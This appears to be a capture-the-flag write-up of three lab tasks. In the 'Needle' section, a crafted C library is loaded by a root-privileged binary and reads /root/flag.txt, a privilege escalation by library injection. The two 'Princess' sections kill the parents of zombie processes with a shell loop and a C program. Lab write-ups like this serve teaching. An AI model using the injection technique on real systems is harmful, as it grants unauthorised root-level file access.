
# Needle

The given code prints whatever "NAME" we pass to it, and it doesn't print the flag, so we just go and read our flag and hand it over as the name. We can't read the flag ourselves because we don't have permissions. But the `meeting` in VM have permissions, and it loads our library. Since our library is launched through a binary with root privileges, it also gets privileges.

```
#include <stdlib.h>
#include <stdio.h>

void* meeting(void* inp){
    char* flag_fabric_storage = malloc(256);
    FILE* f = fopen("/root/flag.txt", "r");
    if (f) {
        fgets(flag_fabric_storage, 256, f);
        fclose(f);
    }
    
    return flag_fabric_storage;
}
```

# Princess

Dead princesses are zombies whose name contains "princess". To free them, you need to kill their parents so that `init` release them. Such processes appear periodically. To kill 50 of them, you need to wait.

```
while true; do ps axo ppid,stat,comm | awk '$2 == "Z" && $3 ~ /princess/ {print $1}' | xargs -r kill -9; done;
```

# Princess2

Now we need to kill 100 princesses without using some commands. To do this, we'll write some C code. First, we get the PID from the `/proc` directory. Then we go into the stats of a specific process, `proc/{pid}/stat`, and get the command, state, pid, and ppid. We filter the processes as in the previous task. Then we run the code and wait.

```
#include <stdio.h>
#include <dirent.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>


int main(){

    while (1){
        DIR *d = opendir("/proc");
        struct dirent *e;
        FILE *f;

        while ((e = readdir(d))) {
            char path[512];
            char comm[256];
            char state;
            int  pid, ppid;

            if (e->d_name[0] < '0' || e->d_name[0] > '9') continue; 
            
            snprintf(path, sizeof(path), "/proc/%s/stat", e->d_name);
            f = fopen(path, "r");
            if (!f) continue;
            if (fscanf(f, "%d (%*[^)]) %c %d", &pid, &state, &ppid) != 3) {
                fclose(f);
                continue;
            }
            fclose(f);

            snprintf(path, sizeof(path), "/proc/%s/comm", e->d_name);
            f = fopen(path, "r");
            if (!f) continue;
            fgets(comm, sizeof(comm), f);
            comm[strcspn(comm, "\n")] = '\0';
            fclose(f);


            if (strstr(comm, "princess") != NULL && state == 'Z') {
                kill(ppid, SIGKILL);
            }

        }
        closedir(d);

        sleep(15);
    }
}

```

